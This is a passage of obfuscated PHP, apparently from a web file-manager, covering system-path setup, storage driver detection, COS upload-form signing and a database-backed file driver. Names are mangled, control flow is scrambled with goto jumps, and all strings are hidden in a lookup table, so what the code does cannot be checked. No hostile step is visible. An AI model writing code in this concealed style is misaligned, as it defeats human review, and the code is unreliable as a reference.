IO::info($f…Œ¡ÌıŸØ); $eæ€åœ§ì™ = _get($E∫·œÜ£çÚ, $AÆ™ëàÏòá[1197], $AÆ™ëàÏòá[33]); goto bçÛ≠ÖÊÌÖ; f†ÕîÉæë©: return $eæ€åœ§ì™; goto aúÑœÕã©à; aúÑœÕã©à: } public static function initSystemPath() { goto aΩ’Î§±ØÁ; f∂Ù«óã©: define($Fßå¿¨Ù‚[1200], self::systemPath($Fßå¿¨Ù‚[1201])); define($Fßå¿¨Ù‚[1202], self::systemPath($Fßå¿¨Ù‚[1203])); define($Fßå¿¨Ù‚[1204], self::systemPath($Fßå¿¨Ù‚[1205])); goto bƒŒºäÇ¨è; aΩ’Î§±ØÁ: $Fßå¿¨Ù‚ =& $_SERVER[’ÿƒ†ïò]; if (defined($Fßå¿¨Ù‚[1198])) { return; } define($Fßå¿¨Ù‚[1198], self::systemPath($Fßå¿¨Ù‚[1199])); goto f∂Ù«óã©; bƒŒºäÇ¨è: IOHistory::bindEvent(); goto a¿≈‘“Ò—‡; a¿≈‘“Ò—‡: } public static function systemPath($fÒÈ©Â√ô∏) { goto dÇ∆â‹Î¶õ; dÇ∆â‹Î¶õ: $f¡Ã’ƒÌéÙ =& $_SERVER[’ÿƒ†ïò]; $AúËãã¶äí = $f¡Ã’ƒÌéÙ[1206] . ucfirst($fÒÈ©Â√ô∏); $F®Ö®íÚêﬁ = Model($f¡Ã’ƒÌéÙ[758])->get($AúËãã¶äí); goto fÆÈò˜á”°; fÆÈò˜á”°: if ($F®Ö®íÚêﬁ) { return $F®Ö®íÚêﬁ; } if ($fÒÈ©Â√ô∏ == $f¡Ã’ƒÌéÙ[1199]) { $F®Ö®íÚêﬁ = self::make(Model($f¡Ã’ƒÌéÙ[820])->systemRootPathAdd($f¡Ã’ƒÌéÙ[531])); } else { $F®Ö®íÚêﬁ = self::systemPath($f¡Ã’ƒÌéÙ[1199]); $CØöã¢ûπÑ = self::sourceID($F®Ö®íÚêﬁ); $F®Ö®íÚêﬁ = self::make(Model($f¡Ã’ƒÌéÙ[820])->mkdir($CØöã¢ûπÑ, $fÒÈ©Â√ô∏)); } Model($f¡Ã’ƒÌéÙ[758])->set($AúËãã¶äí, $F®Ö®íÚêﬁ); goto CëãÊﬁüêƒ; CëãÊﬁüêƒ: return $F®Ö®íÚêﬁ; goto aæÎáÇ∆ê˘; aæÎáÇ∆ê˘: } public static function systemFolder($D·±âÈ•†Ç) { $BÛùÚ∑îƒã = IO_PATH_SYSTEM_SOURCE . $D·±âÈ•†Ç; $F“Îæ¡ãä´ = Cache::get($BÛùÚ∑îƒã); if (!$F“Îæ¡ãä´) { $BäÁèôúŒü = IO::infoFull($BÛùÚ∑îƒã); if (!$BäÁèôúŒü) { $F“Îæ¡ãä´ = IO::mkdir($BÛùÚ∑îƒã, REPEAT_SKIP); } else { $F“Îæ¡ãä´ = $BäÁèôúŒü[$_SERVER[’ÿƒ†ïò][76]]; } Cache::set($BÛùÚ∑îƒã, $F“Îæ¡ãä´, 3600 * 10); } return $F“Îæ¡ãä´; } public static function defaultDriver() { return Model($_SERVER[’ÿƒ†ïò][755])->defaultDriver(); } public static function defaultIO() { $d¬ë™∆†û£ =& $_SERVER[’ÿƒ†ïò]; $E›Ù÷≥Òﬂ∑ = self::defaultDriver(); return $d¬ë™∆†û£[1207] . $E›Ù÷≥Òﬂ∑[$d¬ë™∆†û£[395]] . $d¬ë™∆†û£[1196]; } public static function defaultDriverInit() { static $Cû‘º∞«¬≠ = false; if ($Cû‘º∞«¬≠) { return $Cû‘º∞«¬≠; } $Cû‘º∞«¬≠ = IO::init(self::defaultIO()); return $Cû‘º∞«¬≠; } public static function fileTypeList() { $CÊëªÌ¡∞Ù =& $_SERVER[’ÿƒ†ïò]; $BÆ¶¥Í¨ü— = $GLOBALS[$CÊëªÌ¡∞Ù[6]][$CÊëªÌ¡∞Ù[1208]]; foreach ($BÆ¶¥Í¨ü— as $Còﬂ™ÖàÕö => $bÙ∫≥åÆ…´) { $cøΩ„î≠òÃ = $CÊëªÌ¡∞Ù[1209] . $Còﬂ™ÖàÕö; $C˘¢◊ò˜çÁ = LNG($cøΩ„î≠òÃ); if ($cøΩ„î≠òÃ != $C˘¢◊ò˜çÁ) { $BÆ¶¥Í¨ü—[$Còﬂ™ÖàÕö][$CÊëªÌ¡∞Ù[28]] = $C˘¢◊ò˜çÁ; } } return $BÆ¶¥Í¨ü—; } public static function transferType($aí‚§Ï€Âû, $D–¨ö…Öï≠) { goto D–ΩØ†ôõΩ; D–ΩØ†ôõΩ: $eøøìÖØÂÎ =& $_SERVER[’ÿƒ†ïò]; $f©÷∆Éèàù = self::driverType($aí‚§Ï€Âû); $b≈…ÜÑØÇÎ = self::driverType($D–¨ö…Öï≠); goto fï§µæ´èƒ; fï§µæ´èƒ: if ($f©÷∆Éèàù[$eøøìÖØÂÎ[29]] == $b≈…ÜÑØÇÎ[$eøøìÖØÂÎ[29]] && $f©÷∆Éèàù[$eøøìÖØÂÎ[1210]] == $b≈…ÜÑØÇÎ[$eøøìÖØÂÎ[1210]]) { return $eøøìÖØÂÎ[1211]; } if ($f©÷∆Éèàù[$eøøìÖØÂÎ[29]] == $eøøìÖØÂÎ[853] && $b≈…ÜÑØÇÎ[$eøøìÖØÂÎ[29]] == $eøøìÖØÂÎ[106]) { return $eøøìÖØÂÎ[1122]; } if ($f©÷∆Éèàù[$eøøìÖØÂÎ[29]] == $eøøìÖØÂÎ[106] && $b≈…ÜÑØÇÎ[$eøøìÖØÂÎ[29]] == $eøøìÖØÂÎ[853]) { return $eøøìÖØÂÎ[107]; } goto Aà…á©≠∑◊; Aà…á©≠∑◊: return $eøøìÖØÂÎ[1212]; goto E¨‰Ó±™ñ´; E¨‰Ó±™ñ´: } public static function driverType($aàÏÊ‰ÔÇ‰) { goto bÖˆ≠ù∑ä∞; b‹¡ıÚì£: if ($E£¬èΩ€Â€ == $bé◊≤–øòê[746] || $E£¬èΩ€Â€ == $bé◊≤–øòê[1214] || $E£¬èΩ€Â€ == $bé◊≤–øòê[1215]) { $aàÏÊ‰ÔÇ‰ = self::defaultDriverInit(); } else { if ($E£¬èΩ€Â€ == $bé◊≤–øòê[1129] || $E£¬èΩ€Â€ == $bé◊≤–øòê[1216]) { $aàÏÊ‰ÔÇ‰ = IO::init($aàÏÊ‰ÔÇ‰->pathParse[$bé◊≤–øòê[1076]]); } } $E£¬èΩ€Â€ = str_replace($bé◊≤–øòê[1213], $bé◊≤–øòê[33], strtolower($aàÏÊ‰ÔÇ‰->getType())); if ($E£¬èΩ€Â€ == $bé◊≤–øòê[106]) { return array($bé◊≤–øòê[29] => $bé◊≤–øòê[106], $bé◊≤–øòê[1210] => $bé◊≤–øòê[33], $bé◊≤–øòê[76] => $EÎ’Û≤¥≤); } goto bä„⁄‹≠åÿ; bÖˆ≠ù∑ä∞: $bé◊≤–øòê =& $_SERVER[’ÿƒ†ïò]; $EÎ’Û≤¥≤ = $aàÏÊ‰ÔÇ‰->path; $E£¬èΩ€Â€ = str_replace($bé◊≤–øòê[1213], $bé◊≤–øòê[33], strtolower($aàÏÊ‰ÔÇ‰->getType())); goto b‹¡ıÚì£; bä„⁄‹≠åÿ: return array($bé◊≤–øòê[29] => $bé◊≤–øòê[853], $bé◊≤–øòê[1210] => $aàÏÊ‰ÔÇ‰->pathDriver, $bé◊≤–øòê[76] => $EÎ’Û≤¥≤); goto b˘ΩÁíà¢®; b˘ΩÁíà¢®: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($aäÛ∆µåÚØ) { parent::__construct($aäÛ∆µåÚØ); $this->signatureVersion($_SERVER[’ÿƒ†ïò][212]); } public function uploadFormData($D£¬ª√áπÆ, $e•∆⁄ˆ¿îã = 3600) { goto fÊŒ¬ÈÜæà; fÃÁ†ñ˜®¡: return $cÕ˜ﬁçıÖò; goto Eﬁ™ö»‚‹’; E’ëúœ“ªŒ: $F˜àù÷Ê”ƒ = array($aîº¢§æâ§[1219] => $e˘éÉÕ…áç, $aîº¢§æâ§[1220] => array(array($aîº¢§æâ§[1221] => $B®∑®˘µ¡≤), array($aîº¢§æâ§[1222] => $this->bucket), array($aîº¢§æâ§[1223], $aîº¢§æâ§[1224], $aîº¢§æâ§[33]), array($aîº¢§æâ§[1225] => $E≠¥é¯æ”á), array($aîº¢§æâ§[1226] => $Aäí∏Ûô…Ò), array($aîº¢§æâ§[1227] => $this->accessKey), array($aîº¢§æâ§[1228] => $bªıç≈◊áÜ))); $F˜àù÷Ê”ƒ = json_encode($F˜àù÷Ê”ƒ); $DÔúÜ¶øŸÆ = hash_hmac($aîº¢§æâ§[230], $bªıç≈◊áÜ, $this->secret); goto c≈Ÿäî‰êÍ; fÊŒ¬ÈÜæà: $aîº¢§æâ§ =& $_SERVER[’ÿƒ†ïò]; $B®∑®˘µ¡≤ = $aîº¢§æâ§[192]; $Aäí∏Ûô…Ò = $aîº¢§æâ§[230]; goto dëÔÉÑ·¨´; c≈Ÿäî‰êÍ: $a›Üû√€Ê‡ = sha1($F˜àù÷Ê”ƒ); $D–ã·≈”É‹ = hash_hmac($aîº¢§æâ§[230], $a›Üû√€Ê‡, $DÔúÜ¶øŸÆ); $cÕ˜ﬁçıÖò = array($aîº¢§æâ§[1221] => $B®∑®˘µ¡≤, $aîº¢§æâ§[1225] => $E≠¥é¯æ”á, $aîº¢§æâ§[1229] => base64_encode($F˜àù÷Ê”ƒ), $aîº¢§æâ§[1226] => $Aäí∏Ûô…Ò, $aîº¢§æâ§[1227] => $this->accessKey, $aîº¢§æâ§[1230] => $bªıç≈◊áÜ, $aîº¢§æâ§[1231] => $D–ã·≈”É‹, $aîº¢§æâ§[175] => $this->getHost()); goto fÃÁ†ñ˜®¡; dëÔÉÑ·¨´: $E≠¥é¯æ”á = $aîº¢§æâ§[1217]; $e˘éÉÕ…áç = gmdate($aîº¢§æâ§[1218], time() + $e•∆⁄ˆ¿îã); $bªıç≈◊áÜ = (string) time() . $aîº¢§æâ§[68] . (string) (time() + $e•∆⁄ˆ¿îã); goto E’ëúœ“ªŒ; Eﬁ™ö»‚‹’: } public function fileOutLink($câ‡¡ÿƒˆà) { $B˜ë∫ö±®å =& $_SERVER[’ÿƒ†ïò]; if (substr($câ‡¡ÿƒˆà, 0, 7) == $B˜ë∫ö±®å[1232]) { $câ‡¡ÿƒˆà = $B˜ë∫ö±®å[1233] . substr($câ‡¡ÿƒˆà, 7); } header($B˜ë∫ö±®å[159] . $câ‡¡ÿƒˆà); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Dò£Çû∂á–) { $this->pathParse = $Dò£Çû∂á–; $this->model = Model($_SERVER[’ÿƒ†ïò][1234]); } public function getPath($Cß§„ã”º®) { return trim($Cß§„ã”º®, $_SERVER[’ÿƒ†ïò][8]); } public function pathFather($Aœ¯◊‘á¬Á) { $aæıõ„ÚÉá = $this->parse($Aœ¯◊‘á¬Á); $aæıõ„ÚÉá = $this->infoSimple($Aœ¯◊‘á¬Á); return $aæıõ„ÚÉá ? $aæıõ„ÚÉá[$_SERVER[’ÿƒ†ïò][492]] : !1; } public function pathThis($A“ü·§µÏ) { $C˜ÌÙ›÷≥§ = $this->infoSimple($A“ü·§µÏ); return $C˜ÌÙ›÷≥§ ? $C˜ÌÙ›÷≥§[$_SERVER[’ÿƒ†ïò][28]] : !1; } public function getPathOuter($FÔ≠£ŸÇÿ√) { if (!$FÔ≠£ŸÇÿ√) { return $FÔ≠£ŸÇÿ√; } $cÏééæ◊æ‡ = $this->parse($FÔ≠£ŸÇÿ√); return KodIO::make($cÏééæ◊æ‡[$_SERVER[’ÿƒ†ïò][395]]); } public function copyFolderFromIO($b¨‚‘Ç“†ã, $EâçÉ§Ê©Ë, $DÆõ†ìÏ≥Ÿ, $d‘çπ—È≥‰, $b‰°¥›ÍÊî) { $däÔÑÎ»ö∑ = $this->model->copyFolderFromIO($b¨‚‘Ç“†ã, $EâçÉ§Ê©Ë, $DÆõ†ìÏ≥Ÿ, $d‘çπ—È≥‰, $b‰°¥›ÍÊî); return KodIO::make($däÔÑÎ»ö∑); } public function isParentOf($eÁ“Ω∞∞¬ﬂ, $EΩæû∞˜Öë) { return $this->model->isParentOf($eÁ“Ω∞∞¬ﬂ, $EΩæû∞˜Öë); } public function mkfile($C»ëÌµã¥µ, $c¡ﬂßá∑Ã∞ = '', $cπ·ÌÚ≠⁄Ó = REPEAT_RENAME) { $DŒÛè÷…¯õ =& $_SERVER[’ÿƒ†ïò]; $B≤ªÙ›⁄Îò = $this->parse($C»ëÌµã¥µ); $C»ëÌµã¥µ = $B≤ªÙ›⁄Îò[$DŒÛè÷…¯õ[395]]; for ($eàìπûÒ◊… = 0; $eàìπûÒ◊… < count($B≤ªÙ›⁄Îò[$DŒÛè÷…¯õ[1235]]); $eàìπûÒ◊…++) { $C°üÚòÑÜ¢ = $B≤ªÙ›⁄Îò[$DŒÛè÷…¯õ[1235]][$eàìπûÒ◊…]; if ($eàìπûÒ◊… == count($B≤ªÙ›⁄Îò[$DŒÛè÷…¯õ[1235]]) - 1) { $C»ëÌµã¥µ = $this->model->mkfile($C»ëÌµã¥µ, $C°üÚòÑÜ¢, $c¡ﬂßá∑Ã∞, $cπ·ÌÚ≠⁄Ó); break; } $C»ëÌµã¥µ = $this->model->mkdir($C»ëÌµã¥µ, $C°üÚòÑÜ¢, REPEAT_SKIP); } return $this->getPathOuter($C»ëÌµã¥µ); } public function mkdir($fáÜì‚Ã±Ô, $EìÑÈ∞ìé‡ = REPEAT_SKIP) { $eã’¿“æ¬Ñ =& $_SERVER[’ÿƒ†ïò]; $CËÕÖÔ◊ˆÌ = $this->parse($fáÜì‚Ã±Ô); $fáÜì‚Ã±Ô = $CËÕÖÔ◊ˆÌ[$eã’¿“æ¬Ñ[395]]; for ($d¢◊Èõû  = 0; $d¢◊Èõû  < count($CËÕÖÔ◊ˆÌ[$eã’¿“æ¬Ñ[1235]]); $d¢◊Èõû ++) { $b§»∂ΩÌ´Û = $CËÕÖÔ◊ˆÌ[$eã’¿“æ¬Ñ[1235]][$d¢◊Èõû ]; $fáÜì‚Ã±Ô = $this->model->mkdir($fáÜì‚Ã±Ô, $b§»∂ΩÌ´Û, $EìÑÈ∞ìé‡); } return $this->getPathOuter($fáÜì‚Ã±Ô); } public function copyFile($BÍ£§ÑÓçõ, $fπè©ÖªÁ‚, $A¯Ãøû∏•ç = REPEAT_REPLACE) { $aäöúøèËÎ =& $_SERVER[’ÿƒ†ïò]; $CÈóûÊâ≥Ω = $this->parse($fπè©ÖªÁ‚); $E–∆∆õëÉ¥ = $this->model->copy($BÍ£§ÑÓçõ, $CÈóûÊâ≥Ω[$aäöúøèËÎ[395]], $A¯Ãøû∏•ç, $CÈóûÊâ≥Ω[$aäöúøèËÎ[76]]); return $E–∆∆õëÉ¥ ? $this->getPathOuter($E–∆∆õëÉ¥) : !1; } public function moveFile($bÕøÒ‡¯È⁄, $A»‘Æ•µé’, $D‡öî‚°§÷ = REPEAT_REPLACE) { $fÓ·óïÏÀ™ =& $_SERVER[’ÿƒ†ïò]; $c∞ﬂõ≠øá• = $this->parse($A»‘Æ•µé’); $FÒŸÁâ§£Ω = $this->model->move($bÕøÒ‡¯È⁄, $c∞ﬂõ≠øá•[$fÓ·óïÏÀ™[395]], $D‡öî‚°§÷, $c∞ﬂõ≠øá•[$fÓ·óïÏÀ™[76]]); return $FÒŸÁâ§£Ω ? $this->getPathOuter($FÒŸÁâ§£Ω) : !1; } public function copy($DüÖ˘ÓπŸÒ, $BâΩ–Óä˘’, $E·¡ÑÕçëÑ = REPEAT_REPLACE) { $f Ï∫°¶ï† = $this->parse($BâΩ–Óä˘’); $B‚ºıÂÂàû = $this->model->copy($DüÖ˘ÓπŸÒ, $f Ï∫°¶ï†[$_SERVER[’ÿƒ†ïò][395]], $E·¡ÑÕçëÑ); return $B‚ºıÂÂàû ? $this->getPathOuter($B‚ºıÂÂàû) : !1; } public function moveSameAllow() { } public function move($a·¨åÇñÆÖ, $BÍÇÁŒ†ó„, $e¡íù± ∏Æ = REPEAT_REPLACE) { $FÓﬁ„è”ØÉ = $this->parse($BÍÇÁŒ†ó„); $Cÿ‚·ò†Ç™ = $this->model->move($a·¨åÇñÆÖ, $FÓﬁ„è”ØÉ[$_SERVER[’ÿƒ†ïò][395]], $e¡íù± ∏Æ); return $Cÿ‚·ò†Ç™ ? $this->getPathOuter($Cÿ‚·ò†Ç™) : !1; } public function remove($Eì’¯»ïÍŸ, $aá∫í˜ã÷À = true) { return $this->model->remove($Eì’¯»ïÍŸ, $aá∫í˜ã÷À); } public function rename($aÖ∑¥§±≥, $DÙ˜ﬂÑı≈í) { $D˘Ç¢∂Æ‡  = $this->model->rename($aÖ∑¥§±≥, $DÙ˜ﬂÑı≈í); return $D˘Ç¢∂Æ‡  ? $this->getPathOuter($aÖ∑¥§±≥) : $D˘Ç¢∂Æ‡ ; } public function size($C§‰∑›à∞) { $F √ò“ãÿê = $this->infoSimple($C§‰∑›à∞); return $F √ò“ãÿê ? $F √ò“ãÿê[$_SERVER[’ÿƒ†ïò][78]] : 0; } public function infoSimple($aêÒö¨˘õû) { return $this->model->sourceInfo($aêÒö¨˘õû); } public function info($cãëœ∑ö‘) { return $this->infoParse($cãëœ∑ö‘); } public function infoAuth($CÕßì≥ˆåô) { return $this->infoParse($CÕßì≥ˆåô, !1, !0); } public function infoWithChildren($dä …äŒ“) { return $this->infoParse($dä …äŒ“, !0); } protected function infoParse($a˜ô¯∫€‰π, $Bß¶√Ê⁄ó¶ = false, $A√∫⁄íÇöã = false) { if (!$Bß¶√Ê⁄ó¶) { return $this->model->pathInfo($a˜ô¯∫€‰π, $A√∫⁄íÇöã); } return $this->model->pathInfoMore($a˜ô¯∫€‰π); } public function infoFull($eÁÒ¢êêºÖ) { $F´åÌ±Ø‚Ç =& $_SERVER[’ÿƒ†ïò]; $bÌÜ∫ß”î≠ = explode($F´åÌ±Ø‚Ç[8], $eÁÒ¢êêºÖ); $A‡ÖÚ®ÁÖÖ = implode($F´åÌ±Ø‚Ç[8], array_splice($bÌÜ∫ß”î≠, 1)); return $this->model->pathInfoByPath($bÌÜ∫ß”î≠[0], $A‡ÖÚ®ÁÖÖ); } public function hashSimple($A≤ÙôÎ±µ€) { $B∏•◊ﬂ©ÖÖ =& $_SERVER[’ÿƒ†ïò]; $BëîØó»›ƒ = $this->infoWithChildren($A≤ÙôÎ±µ€); return $BëîØó»›ƒ[$B∏•◊ﬂ©ÖÖ[164]][$B∏•◊ﬂ©ÖÖ[171]]; } public function hashMd5($dπË∑‹®ÀÆ) { $EÁÕ™ßùò‘ =& $_SERVER[’ÿƒ†ïò]; $d°œÓø¡¿÷ = $this->infoWithChildren($dπË∑‹®ÀÆ); return $d°œÓø¡¿÷[$EÁÕ™ßùò‘[164]][$EÁÕ™ßùò‘[170]]; } public function exist($b‹©„£¶ë÷) { $eúÿÛÖœÔ· =& $_SERVER[’ÿƒ†ïò]; $a É•œ€©≤ = $this->parse($b‹©„£¶ë÷); if (!$a É•œ€©≤[$eúÿÛÖœÔ·[76]]) { return $this->isFile($b‹©„£¶ë÷) || $this->isFolder($b‹©„£¶ë÷); } $B∑÷ê…Ã– = array($eúÿÛÖœÔ·[396] => $a É•œ€©≤[$eúÿÛÖœÔ·[395]], $eúÿÛÖœÔ·[28] => $a É•œ€©≤[$eúÿÛÖœÔ·[76]]); $f√á≠à√ˆö = $this->model->where($B∑÷ê…Ã–)->find(); return $f√á≠à√ˆö ? !0 : !1; } public function isFile($FŒì¥ãÈ⁄Ù) { $cñ»çﬂ˜†¢ =& $_SERVER[’ÿƒ†ïò]; $DÆ”ö∫¡“≥ = $this->infoSimple($FŒì¥ãÈ⁄Ù); return $DÆ”ö∫¡“≥ && $DÆ”ö∫¡“≥[$cñ»çﬂ˜†¢[405]] == $cñ»çﬂ˜†¢[87] ? !1 : !0; } public function isFolder($E°óñÍëŒº) { $D§ö≠Úˆ«ê =& $_SERVER[’ÿƒ†ïò]; $a…± ≠î–¿ = $this->infoSimple($E°óñÍëŒº); return $a…± ≠î–¿ && $a…± ≠î–¿[$D§ö≠Úˆ«ê[405]] == $D§ö≠Úˆ«ê[87] ? !0 : !1; } public function listPath($eÛØã‡ú∞Û, $BàïÜ‹∂‹” = false) { $F˘¬ç—ììì =& $_SERVER[’ÿƒ†ïò]; if ($eÛØã‡ú∞Û == $F˘¬ç—ììì[33]) { return !1; } $dˆ¨Ç˘â = array($F˘¬ç—ììì[396] => $eÛØã‡ú∞Û); if ($BàïÜ‹∂‹”) { return $this->model->listSource($dˆ¨Ç˘â, -1); } return $this->model->listSource($dˆ¨Ç˘â); } public function has($dáëá∆ëÕ∏, $e¥í∂çÊ´Ω = false, $A€‘”›À¶¬ = null) { $DƒêìÖá Ù =& $_SERVER[’ÿƒ†ïò]; $D€ïâ≤ä§  = $this->infoWithChildren($dáëá∆ëÕ∏); if ($e¥í∂çÊ´Ω) { return array($DƒêìÖá Ù[204] => $D€ïâ≤ä§ [$DƒêìÖá Ù[204]], $DƒêìÖá Ù[203] => $D€ïâ≤ä§ [$DƒêìÖá Ù[203]]); } return $A€‘”›À¶¬ ? $D€ïâ≤ä§ [$DƒêìÖá Ù[204]] : $D€ïâ≤ä§ [$DƒêìÖá Ù[203]]; } public function listAll($Fπ›Û˘âÕ¥) { $a©Æ¡ìàÿª = IO::info($this->pathParse[$_SERVER[’ÿƒ†ïò][76]]); if (!$a©Æ¡ìàÿª) { return array(); } return $this->model->listAll($Fπ›Û˘âÕ¥); } public function getContent($B˘è¬ÏÃƒÍ) { return $this->model->getContent($B˘è¬ÏÃƒÍ); } public function setContent($D∏÷Úˆ¥—ä, $BäøáèŒÁ∏ = '') { return $this->model->setContent($D∏÷Úˆ¥—ä, $BäøáèŒÁ∏); } public function fileSubstr($bà’ûŸÕ¿Í, $Dπ»√º¡ıè, $EÉ„äø¢⁄•) { return $this->model->fileSubstr($bà’ûŸÕ¿Í, $Dπ»√º¡ıè, $EÉ„äø¢⁄•); } public function download($B√°≥öª¶ô, $Dé™¨òæä‹ = '') { $Fç’ÓË˜®ú = get_path_father($Dé™¨òæä‹); $dèù±˜ÜÑä = get_path_this($Dé™¨òæä‹); $a≈êÓÇë≥° = $this->model->fileInfoGet($B√°≥öª¶ô); $AäààÍêËﬁ = IO::copy($a≈êÓÇë≥°[$_SERVER[’ÿƒ†ïò][76]], $Fç’ÓË˜®ú, !1, $dèù±˜ÜÑä); return $AäààÍêËﬁ; } public function setModifyTime($EõüÚËá··, $AÙÛ¯Ÿäª© = '') { $CÇÇó¨‚•ÿ =& $_SERVER[’ÿƒ†ïò]; if (!$EõüÚËá··) { return; } $this->model->where(array($CÇÇó¨‚•ÿ[412] => $EõüÚËá··))->save(array($CÇÇó¨‚•ÿ[84] => $AÙÛ¯Ÿäª©)); } public function upload($B¢ãú∞∞ÁË, $EƒƒÔñûœ˘, $b‘ì∆≠Ÿ® = false, $dÙÑ“∞ôé± = REPEAT_REPLACE) { $FúÓöÒÍßµ =& $_SERVER[’ÿƒ†ïò]; $bËÙÉœÈ⁄Û = $this->parse($B¢ãú∞∞ÁË); $cëè‹°–πü = $this->model->addFile($bËÙÉœÈ⁄Û[$FúÓöÒÍßµ[395]], $EƒƒÔñûœ˘, $bËÙÉœÈ⁄Û[$FúÓöÒÍßµ[76]], $b‘ì∆≠Ÿ®, $dÙÑ“∞ôé±); return $this->getPathOuter($cëè‹°–πü); } public function uploadFileByID($f÷êÉ‡àŸë, $f‡µñâßéﬂ, $càŒÃÕöã) { $bÉûÑ¶»¯« =& $_SERVER[’ÿƒ†ïò]; $Câí±´„åû = $this->parse($f÷êÉ‡àŸë); $còº∑Ò…Êá = $this->model->addFileByFileID($Câí±´„åû[$bÉûÑ¶»¯«[395]], $f‡µñâßéﬂ, $Câí±´„åû[$bÉûÑ¶»¯«[76]], $càŒÃÕöã); return $this->getPathOuter($còº∑Ò…Êá); } public function addFileByRemote($BìéÿìÖŒ¨, $D„ôŸ€©Æâ, $E÷»äù°ΩÍ = array(), $bœÌ∏›çí• = '', $dä≤ß§äÚ±) { $dëˆã˘Êâã =& $_SERVER[’ÿƒ†ïò]; $e€Âó≥€¬‰ = $this->parse($BìéÿìÖŒ¨); $bœÌ∏›çí• = empty($bœÌ∏›çí•) ? $e€Âó≥€¬‰[$dëˆã˘Êâã[76]] : $bœÌ∏›çí•; $cÍÕÆüµë¬ = $this->model->addFileByRemote($e€Âó≥€¬‰[$dëˆã˘Êâã[395]], $D„ôŸ€©Æâ, $bœÌ∏›çí•, $E÷»äù°ΩÍ, $dä≤ß§äÚ±); return $this->getPathOuter($cÍÕÆüµë¬); } public function uploadLink($EÑèáÆç£æ, $Dáäó‡‡‰È = 0) { $e «Ûï¬Úà =& $_SERVER[’ÿƒ†ïò]; $BüÓ¨Øë¡Ã = $this->parse($EÑèáÆç£æ); $f‘–Â©ÂóÁ = _get($GLOBALS[$e «Ûï¬Úà[7]], $e «Ûï¬Úà[1236]); $Fò¨√åøÜ = _get($GLOBALS[$e «Ûï¬Úà[7]], $e «Ûï¬Úà[1237]); $EÑèáÆç£æ = Model($e «Ûï¬Úà[597])->createFileName($BüÓ¨Øë¡Ã[$e «Ûï¬Úà[76]], $f‘–Â©ÂóÁ, $Fò¨√åøÜ); return IO::uploadLink($EÑèáÆç£æ, $Dáäó‡‡‰È); } public function fileNameAuto($eÈÉÒ›Æ≥Ë, $dØ⁄Çë÷Ï⁄, $b⁄±⁄Ü«Øé = REPEAT_REPLACE, $e‹√µàÔä™ = false) { return $this->model->fileNameAuto($eÈÉÒ›Æ≥Ë, $dØ⁄Çë÷Ï⁄, $b⁄±⁄Ü«Øé, $e‹√µàÔä™); } public function fileNameExist($C¥òùÇ¥á∫, $DìÔŒÀ≥≈) { return $this->model->fileNameExist($C¥òùÇ¥á∫, $DìÔŒÀ≥≈); } protected function _fileOut($F°†ˆıÑ•˜, $E›ﬂ›ﬂ“ˆ∂ = false, $A¯ˆÆ°ä≤ú = false, $BµÁÆöªéÿ = '', $FôÑ∞ñºä› = false) { goto aØ––ä£¢¿; fé∞«çÏ ≤: $C‰ˆ¬«Òµœ = $this->model->fileInfoGet($F°†ˆıÑ•˜); $BµÁÆöªéÿ = $C‰ˆ¬«Òµœ[$fë‡äﬂü¬˘[170]] ? $C‰ˆ¬«Òµœ[$fë‡äﬂü¬˘[170]] : $BµÁÆöªéÿ; $Aπ˜ëÍÇÏ = isset($GLOBALS[$fë‡äﬂü¬˘[1239]]) ? $GLOBALS[$fë‡äﬂü¬˘[1239]] : $CéÒ›§πŸ¿[$fë‡äﬂü¬˘[28]]; goto bˆÕ°úÑ˜ ; bˆÕ°úÑ˜ : if ($FôÑ∞ñºä›) { return IO::fileOutServer($C‰ˆ¬«Òµœ[$fë‡äﬂü¬˘[76]], $E›ﬂ›ﬂ“ˆ∂, $Aπ˜ëÍÇÏ, $BµÁÆöªéÿ); } IO::fileOut($C‰ˆ¬«Òµœ[$fë‡äﬂü¬˘[76]], $E›ﬂ›ﬂ“ˆ∂, $Aπ˜ëÍÇÏ, $BµÁÆöªéÿ); goto EëÃÖ•Ø’Ø; aØ––ä£¢¿: $fë‡äﬂü¬˘ =& $_SERVER[’ÿƒ†ïò]; $CéÒ›§πŸ¿ = $this->model->sourceInfo($F°†ˆıÑ•˜); if ($CéÒ›§πŸ¿[$fë‡äﬂü¬˘[405]] == $fë‡äﬂü¬˘[87]) { header($fë‡äﬂü¬˘[1238]); die; } goto fé∞«çÏ ≤; EëÃÖ•Ø’Ø: } public function fileOut($Dã¨‡åÎ±¡, $C˜•ôøèª• = false, $E∞‘È˘¿÷ë = false, $a≥öùÍ∏€¿ = '') { $this->_fileOut($Dã¨‡åÎ±¡, $C˜•ôøèª•, $E∞‘È˘¿÷ë, $a≥öùÍ∏€¿); } public function fileOutServer($AîÕ«ÛÈÉ•, $cœÔ“õÜ…ç = false, $AÃõ¶„ßúŒ = false, $d®©‡≠å‚• = '') { $this->_fileOut($AîÕ«ÛÈÉ•, $cœÔ“õÜ…ç, $AÃõ¶„ßúŒ, $d®©‡≠å‚•, !0); } protected function _fileOutImage($bïÜ…◊±‚™, $Då“†ø–⁄≥ = 250) { goto BÏËòÉÃ≠´; f•∂†àœñ : $GLOBALS[$EéŸ•íÍÑ©[1239]] = $c‘†…öªø—[$EéŸ•íÍÑ©[28]]; $GLOBALS[$EéŸ•íÍÑ©[162]] = $c‘†…öªø—; IO::fileOutImage($c‘†…öªø—[$EéŸ•íÍÑ©[76]], $Då“†ø–⁄≥); goto cÜË™ò÷ÿ‡; BÏËòÉÃ≠´: $EéŸ•íÍÑ© =& $_SERVER[’ÿƒ†ïò]; $cÌı“«òú… = $this->model->pathInfo($bïÜ…◊±‚™); if ($cÌı“«òú…[$EéŸ•íÍÑ©[405]] == $EéŸ•íÍÑ©[87]) { show_json($EéŸ•íÍÑ©[1240] . $bïÜ…◊±‚™, !1); } goto bñ⁄ãáÜÕ—; bñ⁄ãáÜÕ—: $c‘†…öªø— = $this->model->fileInfoGet($bïÜ…◊±‚™); $c‘†…öªø—[$EéŸ•íÍÑ©[28]] = $cÌı“«òú…[$EéŸ•íÍÑ©[28]]; $c‘†…öªø—[$EéŸ•íÍÑ©[163]] = $cÌı“«òú…[$EéŸ•íÍÑ©[163]]; goto f•∂†àœñ ; cÜË™ò÷ÿ‡: } public function fileOutImage($D¬Í®ß≤äÎ, $e–π˜‰ﬂ®ì = 250) { $this->_fileOutImage($D¬Í®ß≤äÎ, $e–π˜‰ﬂ®ì); } public function fileOutImageServer($aùÊ‘´Ó‹Ç, $cÁŸ£í≥Õ÷ = 250) 